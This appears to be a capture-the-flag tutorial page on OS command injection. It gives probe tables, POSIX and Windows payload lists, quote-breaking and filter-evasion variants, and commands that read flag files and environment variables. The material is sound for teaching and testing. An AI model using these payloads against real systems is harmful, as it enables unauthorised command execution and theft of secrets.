---
title: "Command Injection"
weight: 60
bookToc: true
---

# Command injection

**First find whether input reaches a shell, an executable argument, or only application logic.** Ping, traceroute, DNS, archive, image conversion, PDF and Git wrappers are common sinks.

## 1. First test → control → interpretation

Start from a working request and preserve its other fields.

| Probe value | Control | Meaning if repeatable |
| --- | --- | --- |
| `127.0.0.1;printf CTF_A71` | `127.0.0.1;printf CTF_B82` | Changed output marker suggests a POSIX shell |
| `127.0.0.1;sleep 3` | `127.0.0.1;sleep 0` | Repeatable added delay suggests execution; compare several pairs |
| `127.0.0.1&&printf CTF_A71` | Valid normal host | RHS needs the original command to succeed |
| `invalid-host||printf CTF_A71` | Valid normal host | RHS needs the original command to fail |
| `127.0.0.1&echo CTF_A71` | Change marker | Candidate Windows `cmd.exe`; `&` also has different POSIX semantics |

An echoed payload is not execution. The marker must be produced by the command, or its timing must track the requested delay. Do not diagnose injection from a slow DNS lookup alone.

## 2. POSIX shell payload ladder

These are **raw input values**, before URL/form encoding:

```text
127.0.0.1;id
127.0.0.1|id
127.0.0.1&&id
bad-host||id
127.0.0.1$(id)
127.0.0.1`id`
```

| Syntax | Behavior |
| --- | --- |
| `;` or literal newline | Runs the next command regardless of prior exit code |
| `&&` | Runs next command only after success |
| `||` | Runs next command only after failure |
| `|` | Pipes stdout to the next process; final output is usually the RHS |
| `$(...)` / backticks | Substitutes captured stdout into the surrounding word |
| `#` | Starts a shell comment when recognized at a word boundary |

Command substitution does not necessarily display `id`: the output may instead become an argument to the original executable. Prefer `;printf ...` when possible.

## 3. Quoted contexts

If source shows `ping -c 1 'INPUT'`, break a single quote; if it shows `"INPUT"`, break a double quote. Test the exact context rather than mixing every quote.

```text
127.0.0.1';id;#
127.0.0.1";id;#
127.0.0.1"$(id)"
```

The first two examples comment out trailing shell text. A comment can also hide a required closing parenthesis, making the whole command invalid. Read the constructed command when source exists.

Single quotes suppress substitutions inside them; double quotes still allow `$()` in POSIX shells.

## 4. After confirmation

```sh
id
pwd
ls -la
ls -la /
printenv
cat /flag.txt
```

Use these as the injected command part. Read application source/config to locate the actual challenge file. `printenv` only helps if the secret is an environment variable accessible to that process. File permissions still apply.

Output missing? Try capturing stderr in the same displayed stream:

```text
127.0.0.1;id 2>&1
127.0.0.1;ls /definitely-missing 2>&1
```

No output but a confirmed delay: inspect whether the app saves stdout into a generated report/download. If the challenge provides a callback host, a unique HTTP/DNS callback can establish blind execution; DNS reachability alone does not prove HTTP egress.

## 5. Filter-specific variants

Only use these once a specific removed character or token is observed:

```text
127.0.0.1;cat${IFS}/flag.txt
127.0.0.1;ca''t /flag.txt
127.0.0.1;cat /fl[a]g.txt
127.0.0.1%0aid
```

`${IFS}` relies on POSIX shell expansion and word splitting; it is not universal whitespace. `ca''t` becomes `cat` after shell quote processing. Globs need an actual matching filename. `%0a` is a transport encoding and only becomes a shell newline if decoded before the sink.

## 6. Argument injection: shell metacharacters do nothing

Source such as `subprocess.run(["tool", user_input])` generally passes shell characters literally. A leading option can still alter the invoked tool.

| Candidate input | What to establish |
| --- | --- |
| `--help` | Does output change to that executable's help? |
| `--version` | Does the binary interpret input as an option? |
| A documented read/output/config option | Does the wrapper allow a useful capability? |

Options are tool-specific. `--` inserted by the application before user input usually ends option parsing for tools that support it. An option accepted by `curl` is not automatically valid for `wget`, ImageMagick or Git.

## 7. Windows context

```text
127.0.0.1&whoami
127.0.0.1&&whoami
127.0.0.1|whoami
```

For a proven `cmd.exe` sink, inspect `dir`, `type C:\flag.txt`, and `%USERPROFILE%`. PowerShell has different parsing, variable syntax and version-dependent operators; identify the actual interpreter before applying POSIX payloads or `cmd` escaping.

## Troubleshooting

| Result | Next action |
| --- | --- |
| Input appears literally | Compare generated output; reflection alone is insufficient |
| Every request is slow | Control DNS/network latency and queueing before claiming a delay |
| `;` is stripped | Compare raw vs URL-decoded value; check quotes and actual shell |
| `id` runs, `cat` fails | Inspect stderr, permissions and actual path |
| A command works locally only | Check interpreter, PATH, working directory and OS |

Related: [encoding and filters](../encoding-filters/), [SSTI](../ssti/).

Reference: [PortSwigger command injection](https://portswigger.net/web-security/os-command-injection).
